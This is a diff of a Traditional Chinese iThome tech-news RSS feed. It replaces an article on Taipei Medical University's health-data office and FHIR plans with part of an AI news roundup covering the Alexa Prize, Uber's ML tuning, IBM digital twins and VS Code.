@@ -6,307 +6,268 @@
  <description></description>
  <language>zh-hant</language>
 <item>
- <title>北醫治理三院百萬大數據，再攻FHIR癌症基因資料</title>
- <link>https://www.ithome.com.tw/people/146306</link>
- <description>&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;兩年前，臺北醫學大學出現了一個特別的組織。它與資訊處同等，都是一級單位，但職責不只限於學校，更涵蓋3家醫院，一肩扛起北醫體系所有數據管理的重任。&lt;/p&gt;
-&lt;p&gt;帶頭的指揮官，更是一位經驗豐富的IT老將，不僅是萬芳醫院早期發展新一代醫療IT應用的推手，也擔任過首任衛福部資訊處處長，現在更是國際醫療資訊標準協會HL7臺灣分會的理事長。&lt;/p&gt;
-&lt;p&gt;這個組織，就是臺北醫學大學數據處（簡稱北醫大數據處），而這位關鍵人物，就是臺北醫學大學數據處數據長許明暉。「當數據變得非常龐大、複雜時，就需要專責單位分工處理，」許明暉強調：「健康領域更是如此！」&lt;/p&gt;
-&lt;p&gt;甚至，臺灣醫界最常借鏡的美國國衛院（NIH）也早在2018年，設置數據長（Chief Data Officer）一職和資料策略辦公室（ODSS），來建立標準化生醫資料處理流程。隔年，北醫也跟上這股趨勢，在北醫大下設置數據處，來統籌三家附屬醫院和學校的資料管理工作，成為臺灣少數設置數據長的醫療體系。&lt;/p&gt;
-&lt;p&gt;「數據處有如一套共通的基礎設施，」許明暉說明，這樣的角色，整合了附屬醫院和北醫大所有的數據資料，統一提供資料處理服務和客製化資料集，個別單位就不必各自設置相同職責的組織，來處理複雜的數據。許明暉更進一步形容，北醫大數據處就像食材標準化的市場，將龐雜的數據標準化，有如「將原始的食材，製作為料理包，」讓使用者輕鬆烹煮、快速發揮效益。&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;font-size:28px;&quot;&gt;&lt;strong&gt;健康數據有多複雜？不只3家附屬醫院百萬筆資料要打理&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;不過，健康數據究竟有多複雜，需要北醫體系設置專責單位來應對？這從北醫大數據處打理的資料類型，就能以小窺大。&lt;/p&gt;
-&lt;p&gt;首先，他們得治理北醫體系歷年來累積的大量自有資料，包括北醫附醫、萬芳醫院、雙和醫院等三家醫院，徵得病患同意後所取得的各種臨床資料。&lt;/p&gt;
-&lt;p&gt;這三家醫院擁有近380萬名病患的臨床資料，橫跨近半百個科別，小自病患就醫資訊、治療步驟，大至各種手術、檢驗檢查報告，甚至是癌症相關資訊與基因資料，都包含在內。&lt;/p&gt;
-&lt;p&gt;再來是許明暉所稱的「聯盟資料，」也就是用於跨國研究的健康資料。比如，北醫大去年加入國際觀察性健康數據聯盟（OHDSI），成為全球300多個據點中的一員，以「資料不出門、共享演算成果」的模式，來與國際成員交流、研究。&lt;/p&gt;
-&lt;p&gt;為做到這一點，數據處負責資料格式轉換工作，將內部資料轉換為OHDSI專用資料格式OMOP-CDM（Common Data Model），來展開跨國研究。&lt;/p&gt;
-&lt;p&gt;不過，北醫大數據處還需費心處理一類資料，即大量的外部開放資料。舉例來說，他們整理了美國NIH資助打造的重磅醫學重症資料庫MIMIC-III，提供橫跨11年、包含數十萬名患者的住院資料，來給校內師生和醫院同仁使用，一方面作為教學工具，一方面也作為深入研究的材料。&lt;/p&gt;
-&lt;p&gt;不只如此，北醫大數據處還有個經營健保資料庫的任務。衛福部健保署開放健保資料庫加值研究已有數年，全國研究者除了能在衛福部本部申請研究，也能在全臺10個分中心使用，北醫大就是其一。而北醫大數據處，就負責分中心的維運工作。&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;font-size:28px;&quot;&gt;&lt;strong&gt;下設四大中心分工，還有AI專家進駐提供代客烹煮的數據分析服務&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;為進一步管理複雜的健康數據，數據處還下設四大中心，來分工負責不同的內外數據服務。&lt;/p&gt;
-&lt;p&gt;比如，健康暨臨床研究資料加值中心負責維運北醫大健保資料庫分中心，甚至進駐多位統計學專家和資料科學家，來提供「代客烹煮」的數據分析服務。&lt;/p&gt;
-&lt;p&gt;研究者若想以健保相關大數據開發AI模型，但本身AI技能不足，就能透過中心專家來打造模型。許明暉比喻：「這就像我們提供處理好的食材，但顧客不會料理，這時就能透過我們的AI專家，來協助烹調。」&lt;/p&gt;
-&lt;p&gt;再來，數據處還有個臨床數據中心，負責整合三家醫院的電子病歷資料，包括病患基本訊息、就醫資訊、檢驗報告、治療步驟等結構化資料，以及醫師記錄、病理報告、醫學影像報告等非結構化資料。臨床數據中心專門將這些資料，彙整為可分析的資料。&lt;/p&gt;
-&lt;p&gt;今年8月，數據處還新設一個北醫非常期待的單位「生物資訊中心」，來專攻精準醫療。這個中心將結合校內高通量生物技術和雲端分析平臺，運用自有的百萬筆臨床數據和需複雜運算才能處理的多體學（Omics）資料，來打造一站式生物數據分析服務。&lt;/p&gt;
-&lt;p&gt;這就是北醫大數據處生物資訊中心的目標。但他們還有一個任務：分擔中研院發起的臺灣精準醫療計畫（TPMI）。這個TPMI計畫，是要打造臺灣百萬人基因資料庫，而北醫大負責收集其中5萬人的基因資料，未來，生物資訊中心還將提供相關資料分析服務。&lt;/p&gt;
-&lt;p&gt;除了這三個中心，數據處下還有一個專精教育數據分析的校務研究中心，來負責教育數據處理。比如，該中心會追蹤學生在校和離校後的表現，進一步協助學校擬定多元入學政策。&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;font-size:28px;&quot;&gt;&lt;strong&gt;遵循敏捷開發小而美精神，與使用者完善客製化資料集&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;這些資料林林總總，相當複雜，著手處理更煞費苦心。不過，許明暉也分享一套實戰法則，來說明團隊如何打造使用者可立即上手的乾淨資料集。&lt;/p&gt;
-&lt;p&gt;以臨床數據來說，醫院取得病人同意的臨床資料後，會由北醫大資訊處進行資料ETL，將資料放置到特定資料湖，再由數據處接手，展開資料處理工作。&lt;/p&gt;
-&lt;p&gt;這時，為建立符合使用者需求的資料集，數據處會先找出資料集的組成特徵，比如某疾病涵蓋的人口、病患性別比、壽命分類，甚至是超過特定就醫次數的病患數這類細緻特徵。&lt;/p&gt;
-&lt;p&gt;接著就進入建置階段。他們遵循敏捷開發Scrum精神，以每個專案最少3人、最多7人的規模建置資料集。這對擁有20多名人力的數據處來說恰到好處，既不占用過多人力，也不至於不足。&lt;/p&gt;
-&lt;p&gt;過程中，他們每1、2周就檢視進度，以這種小而美、邊執行邊修正的方式，來完善資料集。許明暉更強調：「我們不追求一次做到最完美，而是資料集整理到一定程度後，就先開放申請，讓團隊跟著使用者一起使用。」正是這股跟著使用者一起做的精神，讓數據處更能根據使用者回饋，進一步精進資料集。&lt;/p&gt;
-&lt;p class=&quot;rtecenter&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/1039-%E5%8C%97%E9%86%AB-CDO-%E6%94%9D%E5%BD%B1-%E6%B4%AA%E6%94%BF%E5%81%89-600.jpg&quot; style=&quot;width: 600px;&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;color: rgb(105, 105, 105);&quot;&gt;&lt;strong&gt;臺灣這時投入FHIR基因資料標準化，是最好的切入點！─── 臺北醫學大學數據處數據長 許明暉&lt;/strong&gt;　（攝影／洪政偉）&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;font-size:28px;&quot;&gt;&lt;strong&gt;用NLP工具協助醫師快速抓出病理報告重點&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;不只建置資料集，數據處也會提供AI工具，來優化醫院的臨床作業流程。比如，他們利用一套開源自然語言處理（NLP）模型，打造成可以抓取關鍵文字訊息的AI工具，來加速處理結構鬆散（Free text）的文字型報告。&lt;/p&gt;
-&lt;p&gt;其中最成熟的應用，就是從病理切片報告中，擷取出乳癌三陰性關鍵訊息，並將訊息自動匯出到Excel表格，轉換為結構化資料，來快速提示報告重點、協助醫師決策。&lt;/p&gt;
-&lt;p&gt;「這種三陰性特徵很棘手，」許明暉解釋，三陰性乳癌預後不理想，因此在臨床上備受重視。這類病理報告通常一份數百字，但三陰性特徵不會清楚地集中出現在報告某一處，負責醫師得仔細閱讀所有報告，從不同段落找出這三種特徵才行。&lt;/p&gt;
-&lt;p&gt;因此，透過NLP工具快速從病理報告中整理出這些特徵，就能協助醫生更快制定治療策略，甚至是預測預後。&lt;/p&gt;
-&lt;p&gt;許明暉也希望，這個NLP幫手未來還能更聰明，比如能根據前後文判斷更精準的資訊，「看到醫師寫的數字，就能判斷是年齡、身高還是體重，」他說。&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;font-size:28px;&quot;&gt;&lt;strong&gt;第一道防線把關資料合法性，還找來美NIH標竿人物給建議&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;打理如此龐雜的健康資料，許明暉透露，數據處還有四大原則來指導。首先是「資料合法性」，他舉例，要取得臨床數據，必須先以知情同意書，告知患者資料去識別化後的用途、取得同意。&lt;/p&gt;
-&lt;p&gt;再來是多元機制原則。比如，醫療資料可用於非營利的教學研究，也能用於藥廠研發新藥等盈利目的，北醫大數據處要做的是，讓患者能選擇資料用途，而非只單純詢問是否願意提供資料。&lt;/p&gt;
-&lt;p&gt;第三個原則是「退出機制」。許明暉解釋，病人既然願意授權資料使用，也應有中途退出的權力。對此，數據處會依意願來調整資料集，刪除中途退出的患者資料、保障退出權力。&lt;/p&gt;
-&lt;p&gt;最後是隱私安全，數據處不僅要將患者資料去識別化，還要確保資料不被有心人士竊取。因此，數據處與資訊處密切合作，由資訊處打理一切IT、資安工作，比如資料湖建置、防火牆設置、運算資源提供等，讓數據處專心負責資料處理工作。&lt;/p&gt;
-&lt;p&gt;但這些還不夠，為進一步與國際接軌，北醫大還請來一位參與過NIH百萬人基因計畫、美國大型電子病歷資料研究計畫的標竿級人物—美國范德堡大學生物統計系主任石瑜，來擔任顧問角色，指導北醫大的數據發展策略，來接軌國際醫療大數據的作法。&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;font-size:28px;&quot;&gt;&lt;strong&gt;下一步攻癌症、基因資料FHIR化&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;不只藉助標竿大師經驗改善資料管理作法，數據處下一步還要往國際醫療資料交換標準FHIR邁進。這個標準由國際醫療資訊標準協會HL7制定，就像是一套通用的溝通語言，讓不同組織、不同廠牌儀器產出的資料，也能互相溝通。&lt;/p&gt;
-&lt;p&gt;「但這種溝通形式，較適合北美大型市場，對習慣走客製化資料交換規格、規模小的臺灣市場來說，FHIR會推得很辛苦，」許明暉坦言。因此，他們並非要從頭將所有資料轉換為FHIR格式，而是鎖定跨國研究這個目標，來推動FHIR應用，特別是癌症研究資料的FHIR化。&lt;/p&gt;
-&lt;p&gt;他解釋，選在這個時間點投入，是因為以FHIR架構為核心的癌症資料系統mCODE逐年普及，甚至，HL7協會還將mCODE作為旗下FHIR加速器的推廣項目之一，越來越受到各國醫界採用。&lt;/p&gt;
-&lt;p&gt;而且，北醫大數據處加入的OHDSI聯盟，今年更推出能將聯盟OMOP-CDM資料格式自動轉為FHIR格式的工具，讓各成員的數據團隊，能更快建立符合FHIR規格的癌症資料集。對北醫大而言，費了一番功夫將內部資料轉換成聯盟資料的苦功，現在可以很容易地轉換為FHIR格式資料。&lt;/p&gt;
-&lt;p&gt;除了癌症資料，「我們還瞄準基因資料！」許明暉看好這個正在萌芽發展的領域，「美國甚至發起4年計畫，要用FHIR架構推動基因資料標準化！」他直言，基因資料標準化對臺灣非常重要，因為「美國透過4年計畫已逐漸步入正軌，臺灣這時投入，是最好的切入點！」這句話，點出北醫大數據處這位指揮官更遠大的數據願景。&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;color:#FFFFFF;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color:#3399ff;&quot;&gt; CDO小檔案 &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;color:#3399ff;&quot;&gt;&lt;strong&gt;許明暉&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;color:#3399ff;&quot;&gt;&lt;strong&gt;臺北醫學大學數據處數據長&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;學歷：臺北醫學大學醫學科學研究所博士畢業&lt;/p&gt;
-&lt;p&gt;經歷：2005年擔任萬芳醫院醫療資訊副處長，三年後轉任臺北大學資訊長，2013年進入衛福部資訊處，擔任首任處長。2019年回到北醫體系，擔任北醫大數據處數據長，去年起更擔任HL7臺灣理事長&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;color:#FFFFFF;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color:#3399ff;&quot;&gt; 機關檔案 &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;color:#3399ff;&quot;&gt;&lt;strong&gt;臺北醫學大學&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;● 成立時間：1960年&lt;/p&gt;
-&lt;p&gt;● 學校宗旨：以培育兼具人文關懷、創新能力，及國際觀的生醫人才，從事醫療保健、生命科學研究，及服務社會之目標為宗旨&lt;/p&gt;
-&lt;p&gt;● 網址：&lt;a href=&quot;http://www.tmu.edu.tw&quot;&gt;www.tmu.edu.tw&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;● 地址：臺北市信義區吳興街250號&lt;/p&gt;
-&lt;p&gt;● 員工數：約1,700人&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;color:#FFFFFF;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color:#3399ff;&quot;&gt; 數據處檔案 &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;● 直屬主管：數據長許明暉&lt;/p&gt;
-&lt;p&gt;● 數據處名稱：臺北醫學大學數據處&lt;/p&gt;
-&lt;p&gt;● 數據處人數：23人&lt;/p&gt;
-&lt;p&gt;● 數據處分工：數據處下設四中心，包括臨床數據中心、健康資料加值暨統計中心、校務研究中心、生物資訊中心，以整合臨床資料庫、健保資料庫、校務資料庫與應用資料庫為目的，為全校師生與附屬醫院同仁提供即時優質的研究資訊服務&lt;/p&gt;
-&lt;p&gt;&lt;span style=&quot;color:#FFFFFF;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color:#3399ff;&quot;&gt; 數據處大事記 &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;● 2019年：率先全國成立校院數據處&lt;/p&gt;
-&lt;p&gt;● 2020年：3月提供臨床資料庫釋出服務；5月建立TMU Disease BI平臺，提供研究者隨時查詢院內診斷、手術、用藥等臨床資訊，同月串接本校附屬醫院癌症登記檔，並開放申請；7月串接衛福部死亡登記檔；12月以「OHDSI Taiwan Chapter」身分加入國際健康醫療數據聯盟OHDSI&lt;/p&gt;
-&lt;p&gt;● 2021年：8月組織重整，數據處新成立生物資訊中心，將「統計中心」及「健康暨臨床研究資料加值中心」整併為「健康資料加值暨統計中心」&lt;/p&gt;
+ <title>AI趨勢周報第175期：為何20分鐘的對話時間，是今年Amazon對話式AI挑戰賽最大亮點？</title>
+ <link>https://www.ithome.com.tw/news/146407</link>
+ <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;h3&gt;&lt;span style=&quot;vertical-align: top; color: rgb(0, 0, 255);&quot;&gt;重點新聞(0820～0826)&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;對話式AI  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  Alexa Prize  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  SocialBot  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;font-size: 22px;&quot;&gt;&lt;strong&gt;AI和真人天南地北暢聊20分鐘破紀錄，Amazon年度社交機器人挑戰賽最大突破&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;Amazon連年舉辦的Alexa Prize社交機器人（SocialBot）挑戰賽最近落幕，前三名由捷克科技大學、史丹佛大學、紐約州立大學水牛城分校等三組團隊拿下，更重要的是，他們的社交機器人與真人的對話，從體育、政治、科技到流行無所不聊，甚至最長可持續&lt;a href=&quot;https://venturebeat.com/2021/08/19/amazon-taps-its-socialbot-challenge-to-boost-conversational-ai/&quot;&gt;20分鐘&lt;/a&gt;之久，沒有冷場，打破了過往社交Chatbot競賽的紀錄。&lt;/p&gt;
+&lt;p&gt;Chabot一直是企業關注的領域，從早期文字QA、多輪對話再到近來的對話式AI，都是要藉自然語言處理（NLP）技術，來提供更接近真人的溝通服務。&lt;/p&gt;
+&lt;p&gt;Amazon舉辦挑戰賽的初衷也是如此。今年的挑戰賽目標，不只要Chatbot達到連貫性、上下文理解、流暢回應，還包括對話時間。今年，所有決賽團隊的平均對話時間為12分42秒，是2020年決賽團隊的2倍以上，更有一組團隊展現良好的對話品質，得到滿分5分肯定。&lt;/p&gt;
+&lt;p&gt;Alexa AI自然語言理解副總Prem Natarajan指出，平均對話時間是一個重要指標，能用來判斷參賽機器人的互動連貫性和流暢度。對話時間能拉長，就表示細部技術大有進展，比如神經回應生成模型（Neural response generation）、常識知識表徵（Common sense knowledge representations）、對話建模、對話策略，以及用大規模Transformer模型強化的自然語言理解系統。這次挑戰賽的成績，顯示了NLP領域研究再次躍進。&lt;a href=&quot;https://www.amazon.science//academic-engagements/czech-technical-university-team-wins-alexa-prize-socialbot-grand-challenge-4&quot;&gt;（詳全文）&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt; &lt;/p&gt;
- &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-image field-type-image field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;img src=&quot;https://s4.itho.me/sites/default/files/1039-bei_yi_-cdo-she_ying_-hong_zheng_wei_-960.png&quot; width=&quot;960&quot; height=&quot;420&quot; alt=&quot;&quot; title=&quot;臺北醫學大學數據處數據長 許明暉　（攝影／洪政偉）&quot; /&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
- <pubDate>Wed, 25 Aug 2021 23:00:00 +0000</pubDate>
+&lt;div class=&quot;media_embed&quot; height=&quot;516px&quot; width=&quot;918px&quot;&gt;
+&lt;iframe allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot; frameborder=&quot;0&quot; height=&quot;516px&quot; src=&quot;https://www.youtube.com/embed/1Cm36w3GLKw&quot; title=&quot;YouTube video player&quot; width=&quot;918px&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  Uber  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;   模型調校 &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  機器學習  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;font-size: 22px;&quot;&gt;&lt;strong&gt;兼顧品質又能減少專家勞力，Uber ML開發平臺靠3大心法高度自動化&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;對Uber來說，機器學習（ML）模型是執行核心業務決策的重要工具。但模型進入生產環境前，得經過實驗階段，仰賴專家探索特徵、調校參數，或執行離線分析、背景測試等等。不過，隨著模型開發工作越多，AI專家人力的需求也越大。如何兼顧模型品質，又能減少對專家勞力的依賴，Uber日前在自家部落格上，接露了自家ML開發平臺米開朗基羅的三大關鍵，透過超參數優化、及早停止、特徵轉換等方法，來提高模型開發的自動化程度。&lt;/p&gt;
+&lt;p&gt;首先，在超參數優化部分，他們用樹狀模型找出已知問題類別的參數，比如針對二元分類問題進行AUC優化、對回歸問題就用MSE優化，也採用目標函數，讓專家針對特定問題，選擇合適的優化目標。為避免過度擬合，Uber在優化函數中加入「懲罰條件」，來捕捉訓練合測試間的表現差異。&lt;/p&gt;
+&lt;p&gt;接著，為加速龐大資料集的超參數搜尋，Uber設計了一項「及早停止」機制，來制止無效的超參數優化。這個機制，能搭配用來評估ML模型表現的學習曲線，來節省無意義的試驗，降低時間和運算成本。&lt;/p&gt;
+&lt;p&gt;最後一項作法，Uber轉換了他們訓練ML模型時常用的地理空間特徵，將經度和緯度轉換為不同的嵌入向量，從中抽取出地理空間訊號。Uber也設計一個自動機制，將主要複合特徵自動併入樹狀模型的訓練，並自動移除重要性較低的複合特徵。&lt;/p&gt;
+&lt;p&gt;不只是這三大機制，Uber米開朗基羅平臺還提供一些輔助工具，來執行重複性高的調校工作，如模型架構搜尋、決定特徵綜效等。整體來說，這些強化機制讓Uber可用單一框架，來一般迭代性的調校工作，也能對已部署的ML模型，進行一次性的全面調校。&lt;a href=&quot;https://eng.uber.com/tuning-model-performance/&quot;&gt;（詳全文）&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://1fykyq3mdn5r21tpna3wkdyi-wpengine.netdna-ssl.com/wp-content/uploads/2021/07/Featured-Image-768x614.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;color:#FFFFFF;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color:#3399ff;&quot;&gt;  IIBM  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color:#FFFFFF;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color:#3399ff;&quot;&gt;  數位分身  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  市集  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;&lt;strong&gt;IBM布局數位分身服務，打造專屬市集銷售各種實體設備的數位分身&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;IBM不只布局IT、雲端和AI市場，近來也看好數位分身，大推數位分身交換（IBM Digital Exchange）服務，提供了一個線上市集來銷售實體設備的數位分身。&lt;/p&gt;
+&lt;p&gt;主導IBM數位分身研究的IBM傑出工程師Lisa Seacat DeLuca近日&lt;a href=&quot;https://venturebeat.com/2021/08/16/how-ibm-is-using-digital-twins-to-optimize-ai/&quot;&gt;在媒體上透露&lt;/a&gt;，IBM數位分身不只限於一般熟知的工業設備，「只要是能產生數位表徵的物體，都可以建立分身。」她強調，數位分身和AI一體兩面，數位分身能更有效地監控、分享資料，並用這些資料來改善AI模型，同時幫助企業更了解他們的資產。&lt;/p&gt;
+&lt;p&gt;IBM早在去年推出數位分身交換市集，供企業買方和IBM合作夥伴生態系成員交易，IBM合作夥伴可出售故障診斷碼、維護計畫、3D模型及其他與實體物件相關的資料，來讓企業購買。&lt;/p&gt;
+&lt;p&gt;DeLuca指出，這只是數位分身的初步應用，IBM還推出Maximo企業資產管理服務，可進一步搭配數位分身，來預測資產效能、預先維護。&lt;a href=&quot;https://www.ibm.com/products/digital-twin-exchange&quot;&gt;（詳全文）&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://1.cms.s81c.com/sites/default/files/2021-06/Digital_twin_exchange_overview.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;color:#FFFFFF;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color:#3399ff;&quot;&gt;  大型主機 &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color:#FFFFFF;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color:#3399ff;&quot;&gt;  AI推論    &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  Telum處理器  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;&lt;strong&gt;高頻交易風險運算能更快！IBM發布首款大型主機的AI加速處理器，率先用於金融業&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;還在用大型主機的金融業者有好消息了！IBM日前展示一款自行研發的7奈米處理器Telum，具AI加速運算處理能力，將用於下一代IBM Z大型主機上，來解決銀行詐騙、高頻交易等金融難題。IBM透露，首款採用Telum處理器的IBM系統，將於2022年上半年上市。&lt;/p&gt;
+&lt;p&gt;IBM花了三年時間打造這顆新處理器，未來將由三星生產。IBM指出，金融業者可將訓練好的AI模型打包，部署到採用Telum處理器的IBM系統上，來執行模型推論。如此，就能加速金融AI應用，比如用AI進行金融詐騙偵測、用機器學習加速銀行貸款審核，或是處理高吞吐量的金融交易、反洗錢和風險分析等。&lt;/p&gt;
+&lt;p&gt;目前，臺灣仍有不少大型金融業者的核心系統硬體，採用大型主機，這也將成為Telum處理器搶攻的市場。&lt;a href=&quot;https://www.ibm.com/blogs/systems/ibm-telum-processor-the-next-gen-microprocessor-for-ibm-z-and-ibm-linuxone/&quot;&gt;（詳全文）&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;color:#FFFFFF;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color:#3399ff;&quot;&gt;  VS Code 1.59  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color:#FFFFFF;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color:#3399ff;&quot;&gt;  程式語言  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  機器學習 &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;&lt;strong&gt;VS Code新版能自動判斷不明檔案中的程式語言！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;微軟程式碼編輯器VS Code釋出最新1.59版，不只更新圖形介面區域和編輯器，還加入一項預覽功能，能用機器學習技術自動判斷未命名檔案使用的程式語言。&lt;/p&gt;
+&lt;p&gt;這個功能以開源機器學習函式庫Tensorflow.js和社群所貢獻的機器學習模型打造而成。開發者手動啟用該功能後，VS Code就會在撰寫程式的同時偵測語言，並推薦安裝相對應的擴充套件。用戶也可設定對特定語言不啟用自動偵測功能，比如停止自動偵測Markdown無標題檔案等。&lt;a href=&quot;https://code.visualstudio.com/updates/v1_59#_terminal&quot;&gt;（詳全文）&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://code.visualstudio.com/assets/updates/1_59/terminal-dnd.gif&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;color:#FFFFFF;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color:#3399ff;&quot;&gt;  高通  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color:#FFFFFF;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color:#3399ff;&quot;&gt;  無人機平臺  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span style=&quot;color: rgb(255, 255, 255);&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color: rgb(51, 153, 255);&quot;&gt;  AI引擎  &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
